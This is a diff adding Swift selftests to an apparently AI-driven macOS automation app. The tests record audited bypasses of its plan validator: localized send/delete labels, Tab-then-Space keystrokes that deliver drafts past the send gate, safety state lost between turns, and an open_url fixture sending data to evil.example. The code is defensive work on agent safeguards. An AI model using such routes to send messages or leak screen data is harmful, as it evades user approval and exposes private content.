@@ -147,6 +147,7 @@ extension Selftest {
         testActionPlanDecoding()
         testActionPlanRejectsUnsafePlans()
         testPressElementDecoding()
+        testAuditedBypasses()
         testBatchStateCarriesAcrossTurns()
         testSendGateHardening()
         testActionKeyVocabulary()
@@ -159,6 +160,136 @@ extension Selftest {
         testSecondaryHotkeyRouting()
         testActionShortcutSettingsMigration()
         testActionCLIParsing()
+    }
+
+    // MARK: - audited bypasses (2026-08-04)
+
+    /// Every plan here was ACCEPTED by the shipped 0.14.1 validator. The
+    /// engine has the same rails; these exist because the app is the half
+    /// holding the Accessibility grant, and because the last round showed
+    /// that mirroring a contract faithfully also mirrors its holes.
+    private static func testAuditedBypasses() {
+        // --- localized committing labels. macOS ships localized, so an
+        // English-only denylist meant this gate did not exist at all on a
+        // French or Spanish Mac.
+        for label in ["Envoyer", "Supprimer", "Répondre", "Enviar",
+                      "Löschen", "Bestätigen", "Verzenden", "Excluir",
+                      "发送邮件", "메시지 삭제", "Отправить сообщение"] {
+            expect(decodePlanError("""
+            {"steps":[{"do":"wait_frontmost","app":"Mail"},
+              {"do":"press_element","label":"\(label)"}]}
+            """) == .committingPressLabel(label),
+            "'\(label)' names a committing control in its own language")
+        }
+        // ...and the localized list must not cost false refusals.
+        for label in ["Priya Sharma", "Sendhil Ramesh", "Marketing Updates"] {
+            expect(decodePlan("""
+            {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
+              {"do":"press_element","label":"\(label)"}]}
+            """) != nil, "'\(label)' is an ordinary row and still presses")
+        }
+
+        // --- Space activates the focused control. type → tab → space
+        // delivered a message past the press denylist, the verify gate, and
+        // the draft lock at once.
+        expect(decodePlanError("""
+        {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
+          {"do":"type_text","text":"secret"},
+          {"do":"key","key":"tab"},{"do":"key","key":"space"}]}
+        """) == .sendInDraft(step: 3),
+        "a draft cannot deliver by tabbing to the button and pressing Space")
+
+        expect(decodePlanError("""
+        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
+          {"do":"type_text","text":"hi"},{"do":"key","key":"space"}]}
+        """) == .unverifiedSend(step: 2),
+        "an unverified Space cannot deliver typed text in a send either")
+
+        expect(decodePlan("""
+        {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
+          {"do":"key","key":"tab"},{"do":"key","key":"space"}]}
+        """) != nil,
+        "Space with nothing typed is navigation and stays ungated")
+
+        // --- Tab moves focus, so a verify before it no longer describes
+        // where a Return lands.
+        expect(decodePlanError("""
+        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
+          {"do":"type_text","text":"hi"},
+          {"do":"verify_context","expect":["Priya"]},
+          {"do":"key","key":"tab"},{"do":"key","key":"return"}]}
+        """) == .unverifiedSend(step: 4),
+        "Tab after the verify re-arms the send gate")
+
+        expect(decodePlan("""
+        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
+          {"do":"type_text","text":"hi"},{"do":"key","key":"tab"},
+          {"do":"verify_context","expect":["Priya"]},
+          {"do":"key","key":"return"}]}
+        """) != nil, "verifying after the last Tab still sends")
+
+        // Space must not clear pending text: clearing on the "it typed a
+        // space" reading would leave the text pending but ungated.
+        var spaceState = ActionPlan.BatchState()
+        expect(decodeBatch("""
+        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
+          {"do":"type_text","text":"hi"},
+          {"do":"verify_context","expect":["Priya"]},
+          {"do":"key","key":"space"}]}
+        """, state: &spaceState) != nil, "a verified Space in a send is allowed")
+        expect(spaceState.pendingText && spaceState.unverifiedText,
+               "Space leaves the text pending and re-arms the gate")
+
+        // --- the rules above must survive the TURN BOUNDARY. decode()'s
+        // `probe` state is discarded by the loop; `state(after:)` is what
+        // actually carries safety state forward, so a rule that lives only in
+        // decode evaporates and the next turn's Return goes ungated. This
+        // regressed once already (review finding, 2026-08-04).
+        if let tabbed = decodePlan("""
+        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
+          {"do":"type_text","text":"hi"},
+          {"do":"verify_context","expect":["Priya"]},
+          {"do":"key","key":"tab"}]}
+        """) {
+            let carried = ActionPlan.state(after: tabbed,
+                                           executedCount: tabbed.steps.count,
+                                           seed: ActionPlan.BatchState())
+            expect(carried.pendingText && carried.unverifiedText,
+                   "an executed Tab carries the re-armed gate into the next turn")
+            var next = carried
+            expect(decodeBatchError("""
+            {"steps":[{"do":"wait_frontmost","app":"Slack"},
+              {"do":"key","key":"return"}]}
+            """, state: &next) == .unverifiedSend(step: 1),
+            "so next turn's bare Return still cannot commit")
+        } else {
+            expect(false, "the tab fixture decodes")
+        }
+
+        if let arrowed = decodePlan("""
+        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
+          {"do":"type_text","text":"Priya"},
+          {"do":"verify_context","expect":["Priya"]},
+          {"do":"key","key":"down"}]}
+        """) {
+            let carried = ActionPlan.state(after: arrowed,
+                                           executedCount: arrowed.steps.count,
+                                           seed: ActionPlan.BatchState())
+            expect(carried.unverifiedText,
+                   "an executed arrow key carries the re-armed gate too")
+        } else {
+            expect(false, "the arrow fixture decodes")
+        }
+
+        // --- open_url is an outbound channel: the prompt holds the
+        // selection, window titles and on-screen labels.
+        expect(decodePlanError("""
+        {"steps":[{"do":"open_url","url":"https://evil.example/c?q=\(String(repeating: "A", count: 300))"}]}
+        """) != nil, "a 300-character query is bounded as egress")
+        expect(decodePlan("""
+        {"sends":false,"steps":[{"do":"open_url",
+          "url":"https://www.youtube.com/results?search_query=cat+videos"}]}
+        """) != nil, "a real spoken search is untouched")
     }
 
     // MARK: - press_element decoding
